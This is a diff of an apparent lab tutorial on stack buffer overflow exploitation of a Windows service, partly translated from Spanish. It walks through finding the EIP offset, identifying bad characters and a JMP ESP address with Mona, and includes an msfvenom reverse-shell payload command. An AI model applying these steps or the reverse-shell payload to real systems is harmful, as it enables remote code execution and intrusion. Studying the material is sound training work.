@@ -55,7 +55,7 @@ Follow function calls -> Look for strcpy
 
 <img width="643" height="303" alt="image" src="https://github.com/user-attachments/assets/f7d384b0-2dce-498d-8aaa-b83d2da8bf8e" />
 
-# Let's look for the vulnerable function, for that we are going to view/ open subviews and choose the strings option:
+ Let's look for the vulnerable function, for that we are going to view/ open subviews and choose the strings option:
  <img width="643" height="390" alt="image" src="https://github.com/user-attachments/assets/01067810-c630-43df-b187-65fc737f498d" />
 ```
 ```
@@ -85,13 +85,8 @@ If the server crashes while processing long input, it likely indicates a **buffe
 <img width="643" height="335" alt="image" src="https://github.com/user-attachments/assets/122ae761-5584-466c-a312-44dca7715373" />
 
 ---
-
-📸 **Space for exercise screenshots**
-
 ```
-[ espacio para capturas de pantalla del ejercicio ]
 ```
-
 ---
 
 # 🧭 Step 2: Discover Offset to EIP Register
@@ -103,6 +98,7 @@ The **EIP (Instruction Pointer)** controls the program execution flow. If we ove
 Instead of sending `"AAAA..."`, we send a **cyclic pattern**. When the crash occurs, the value found in EIP reveals the exact **offset** where the overwrite happens.
 
 <img width="643" height="163" alt="image" src="https://github.com/user-attachments/assets/eb5c43a3-cc82-49b0-bb7d-17cd0a0ad8f3" />
+
 <img width="643" height="306" alt="image" src="https://github.com/user-attachments/assets/3d1544b5-bf77-4d16-98b5-92348d51e641" />
 
 
@@ -110,10 +106,11 @@ Instead of sending `"AAAA..."`, we send a **cyclic pattern**. When the crash occ
 
 Generate cyclic pattern:
 
-Creamos una carpeta en C: que se llame Mona y asignamos en Immunity
-<img width="643" height="301" alt="image" src="https://github.com/user-attachments/assets/b47847fe-7ca9-4000-8832-ab8149c57df8" />
-<img width="643" height="355" alt="image" src="https://github.com/user-attachments/assets/dff7baee-37b5-4330-b16d-2b9cd76ea51a" />
+We create a folder in C: called Mona and assign it in Immunity:
 
+<img width="643" height="301" alt="image" src="https://github.com/user-attachments/assets/b47847fe-7ca9-4000-8832-ab8149c57df8" />
+
+<img width="643" height="355" alt="image" src="https://github.com/user-attachments/assets/dff7baee-37b5-4330-b16d-2b9cd76ea51a" />
 ```
 ```
 (Windows)
@@ -123,10 +120,14 @@ Generate larger pattern:
 !mona pattern_create 400
 ```
 <img width="643" height="207" alt="image" src="https://github.com/user-attachments/assets/fc92a2f2-0a7d-4476-b908-93cffd101f17" />
+
 <img width="643" height="60" alt="image" src="https://github.com/user-attachments/assets/cb0bfa5f-4f12-4266-8468-dca6a1d64796" />
 
+
 Calculate offset:
+
 <img width="583" height="175" alt="image" src="https://github.com/user-attachments/assets/b61c7a2c-6c4c-491f-aeaf-d2aecc9914d2" />
+
 <img width="592" height="201" alt="image" src="https://github.com/user-attachments/assets/e8a41612-2acc-4730-98f7-64e014cde607" />
 
 ```
@@ -134,35 +135,10 @@ Calculate offset:
 ```
 <img width="643" height="130" alt="image" src="https://github.com/user-attachments/assets/6f3d4087-bdda-4e54-b9ef-726102fa1455" />
 
-!mona findmsp
-```
-
-Example result:
-
-```
-EIP contains normal pattern : 0x41326941 (offset 246)
-```
-
-Metasploit alternative:
-
-```
-pattern_offset.rb -l 400 -q 41326941
-```
-
-Output:
-
 ```
 [*] Exact match at offset 246
-```
-
----
-
-
 
 ```
-
-```
-
 ---
 
 # 🧭 Step 3: Control EIP
@@ -185,22 +161,17 @@ Example payload:
 "A" * 246 + "BBBB"
 ```
 ```
+```
 <img width="565" height="252" alt="image" src="https://github.com/user-attachments/assets/ef4c6f1b-a818-4937-bd44-0bbfcb7e6405" />
 
 If the exploit works, **EIP will contain 0x42424242**.
 
 <img width="643" height="285" alt="image" src="https://github.com/user-attachments/assets/7c0d1f49-5cc4-4eff-bd5d-89a8ed39d805" />
-Con este registro vemos lo que apunta a la siguiente instruccion que la CPU tiene que ejecutar antes de hacer un return.
 
----
-
-📸 **Space for exercise screenshots**
+With this register we see what the next instruction that the CPU has to execute before making a return points to
 
 ```
-[ espacio para capturas de pantalla del ejercicio ]
 ```
-
----
 
 # 🧭 Step 4: Find Bad Characters
 
@@ -217,10 +188,12 @@ These characters must be removed from the final shellcode.
 ## 💻 Notes
 
 Common bad characters:
-Revisamos que manualmente al ejecutar el script, vemos que después de las BBBB, en lugar de empezar por 01 la secuencia, comienza con un 27, lo cual ahí vemos un bad carácter.
-<img width="503" height="288" alt="image" src="https://github.com/user-attachments/assets/db1b1390-c4ac-4b7d-bbc8-5347f68f9442" />
-<img width="643" height="266" alt="image" src="https://github.com/user-attachments/assets/c372eda9-f7d7-487d-82d4-792045a57dad" />
 
+We check manually when running the script, we see that after the BBBB, instead of starting the sequence at 01, it starts with 27, where we see a bad character.
+
+<img width="503" height="288" alt="image" src="https://github.com/user-attachments/assets/db1b1390-c4ac-4b7d-bbc8-5347f68f9442" />
+
+<img width="643" height="266" alt="image" src="https://github.com/user-attachments/assets/c372eda9-f7d7-487d-82d4-792045a57dad" />
 
 ```
 \x00  (Null byte)
@@ -229,10 +202,9 @@ Revisamos que manualmente al ejecutar el script, vemos que después de las BBBB,
 \xFF
 ```
 
-Esto seria un ejemplo de una búsqueda manual. Pero para evitar hacer esto manualmente eliminando los bad caracters del código utilizaremos Mona de nuevo, que nos lo va a hacer de una forma automática sin tener que ir uno a uno manualmente. Para ello:
+This would be an example of a manual search. But to avoid doing this manually by removing the bad characters from the code, we will use Mona again, which will do it for us automatically without having to go one by one manually. For this:
 
-Ejecutamos el comando mona bytearray y nos va a crear el fichero con todos los posibles bad characters en la ruta previamente creada para mona, que seria lo que necesitaríamos para comenzar a identificarlos. Pero ya lo tenemos en el script. 
-
+We run the command mona bytearray and it will create the file with all possible bad characters in the path previously created for Mona, which would be what we need to start identifying them. But we already have it in the script.
 
 Generate byte array:
 
@@ -244,6 +216,7 @@ mkdir C:\Mona
 !mona bytearray
 ```
 <img width="643" height="154" alt="image" src="https://github.com/user-attachments/assets/2866a2db-9278-4ace-9187-71d0f0f6910a" />
+
 <img width="643" height="164" alt="image" src="https://github.com/user-attachments/assets/b8bdce5a-3742-4c91-8b6a-f7913ebb3197" />
 
 Compare memory:
@@ -252,25 +225,24 @@ Compare memory:
 !mona compare -f C:\Mona\bytearray.bin -a ESP_ADDRESS
 ```
 <img width="643" height="382" alt="image" src="https://github.com/user-attachments/assets/37def3bb-9690-4704-a046-a12101fed120" />
+
 <img width="643" height="336" alt="image" src="https://github.com/user-attachments/assets/509c6a03-1d39-4a84-835d-4f461699d3e9" />
 
 Remove bad characters iteratively:
-Hariamos el mismo proceso tantas veces como sea necesario hasta que al ejecutar el script, con los posibles bad caracteres no apareza ningún error en el immunity.  Para ello hay que especificar en el comando de ¡mona bytearray el bad carácter que hemos quitado antes, para que vuelva a generar los bad characters sin el que hemos encontrado previamente:
+
+We would perform the same process as many times as necessary until, when running the script, no errors appear in Immunity with the possible bad characters. For this, you need to specify in the ¡mona bytearray command the bad character that we removed earlier, so that it generates the bad characters again without the one we previously found:
 ```
 !mona bytearray -b "\x00"
 !mona bytearray -b "\x00\x0a"
 !mona bytearray -b "\x00\x0a\x0d"
+---
 ```
 <img width="643" height="140" alt="image" src="https://github.com/user-attachments/assets/b0bbe75a-cd8a-4c2e-b5a9-ace8e067fb06" />
-Con todos los que encontramos hay que añadirlos en el bytearray separado de \. En este caso eran el x00\x0a\x0d
+```
+With all the ones we find, we have to add them in the bytearray separate from . In this case they were the x00x0ax0d
+```
 ---
 <img width="643" height="488" alt="image" src="https://github.com/user-attachments/assets/2e261899-13d8-443d-8795-0713066ba344" />
-
-📸 **Space for exercise screenshots**
-
-```
-[ espacio para capturas de pantalla del ejercicio ]
-```
 
 ---
 
@@ -322,7 +294,8 @@ Search instruction manually:
 <img width="643" height="346" alt="image" src="https://github.com/user-attachments/assets/83172a52-04ef-4464-a6ad-98903660c16e" />
 
 Find opcode:
-Ya sabemos que esta ejecución del programa tiene un salto ESP, entonces la guardamos para no tenerla que buscar de nuevo
+
+We already know that this program execution has an ESP jump, so we save it so we don't have to look for it again
 ```
 !mona find -s "\xff\xe4" -cpb "\x00\x0a\x0d"
 ```
@@ -349,12 +322,7 @@ Search ROP gadgets:
 ```
 <img width="643" height="269" alt="image" src="https://github.com/user-attachments/assets/0aa3e17a-fa86-4e18-8c49-e3735eb7a7ba" />
 
----
-
-📸 **Space for exercise screenshots**
-
 ```
-[ espacio para capturas de pantalla del ejercicio ]
 ```
 <img width="643" height="225" alt="image" src="https://github.com/user-attachments/assets/b00ff090-3efb-4f2b-bc32-9c040e1d56e7" />
 
@@ -379,13 +347,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b
 The bad characters discovered earlier must be excluded using the `-b` parameter.
 
 ---
-
-📸 **Space for exercise screenshots**
-
-```
-[ espacio para capturas de pantalla del ejercicio ]
-```
-
 ---
 
 # 🧭 Step 7: Exploit Vulnerability (RCE / PrivEsc)
@@ -405,14 +366,6 @@ Example structure:
 Once sent to the server, execution flow jumps to **ESP**, runs the shellcode, and provides **remote code execution (RCE)**.
 
 Depending on the service privileges, this may also lead to **privilege escalation**.
-
----
-
-📸 **Space for exercise screenshots**
-
-```
-[ espacio para capturas de pantalla del ejercicio ]
-```
 
 ---
 
